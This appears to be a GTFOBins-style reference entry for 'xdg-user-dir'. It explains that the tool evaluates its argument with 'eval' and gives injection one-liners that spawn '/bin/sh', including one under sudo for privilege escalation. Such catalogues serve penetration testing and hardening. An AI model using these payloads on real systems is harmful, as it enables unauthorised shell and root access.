---
description: |
  The current implementation of `xdg-user-dir` is basically `eval echo \${XDG_${1}_DIR:-$HOME}`, thus is can be easily used to achieve command execution.
functions:
  shell:
    - code: |
        xdg-user-dir '}; /bin/sh #'
  sudo:
    - code: |
        sudo xdg-user-dir '}; /bin/sh #'
---
